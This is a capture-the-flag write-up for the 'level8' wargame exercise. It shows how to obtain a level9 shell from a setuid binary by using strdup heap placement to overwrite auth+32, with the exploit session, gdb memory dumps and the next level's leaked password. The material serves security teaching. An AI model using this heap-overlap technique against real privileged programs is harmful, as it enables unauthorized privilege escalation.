# level8

```sh
$> ls -l ~
-rwsr-s---+ 1 level9 users 6057 Mar  6  2016 level8
```

As we can see by reading the code, it's only when `auth[32] != 0` that we can
access the new shell by a call to `system("/bin/sh")`.  
We need to write data in this byte.  
In order to do that, we can see that the command `service` will `strdup()` whatever we write in the buffer.  
Thanks to this, we can overwrite `auth + 32`.  

```sh
$> ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
service AAAABBBBCCCCDDDD
0x804a008, 0x804a018 
login
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

For a more visual explanation :
```sh
$> gdb -q level8 
Reading symbols from /home/user/level8/level8...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
   0x08048564 <+0>:	push   %ebp
   0x08048565 <+1>:	mov    %esp,%ebp
   0x08048567 <+3>:	push   %edi
   0x08048568 <+4>:	push   %esi
   0x08048569 <+5>:	and    $0xfffffff0,%esp
   0x0804856c <+8>:	sub    $0xa0,%esp
   0x08048572 <+14>:	jmp    0x8048575 <main+17>
   0x08048574 <+16>:	nop
   0x08048575 <+17>:	mov    0x8049ab0,%ecx
   0x0804857b <+23>:	mov    0x8049aac,%edx
   0x08048581 <+29>:	mov    $0x8048810,%eax
   0x08048586 <+34>:	mov    %ecx,0x8(%esp)
   0x0804858a <+38>:	mov    %edx,0x4(%esp)
   0x0804858e <+42>:	mov    %eax,(%esp)
   0x08048591 <+45>:	call   0x8048410 <printf@plt>
   0x08048596 <+50>:	mov    0x8049a80,%eax
   [...]
(gdb) b *0x08048596
Breakpoint 1 at 0x8048596
(gdb) r
Starting program: /home/user/level8/level8 
(nil), (nil) 

Breakpoint 1, 0x08048596 in main ()
(gdb) n
auth 
0x804a008, (nil) 

Breakpoint 1, 0x08048596 in main ()
(gdb) x/32x 0x804a008
0x804a008:	0x0000000a	0x00000000	0x00000000	0x00020ff1
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) n
service AAAABBBBCCCCDDDD
0x804a008, 0x804a018 

Breakpoint 1, 0x08048596 in main ()
(gdb) x/32x 0x804a008
0x804a008:	0x0000000a	0x00000000	0x00000000	0x00000019
0x804a018:	0x41414120	0x42424241	0x43434342	0x44444443
0x804a028:	0x00000a44	0x00020fd9	0x00000000	0x00000000
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a078:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) n
login
$
```
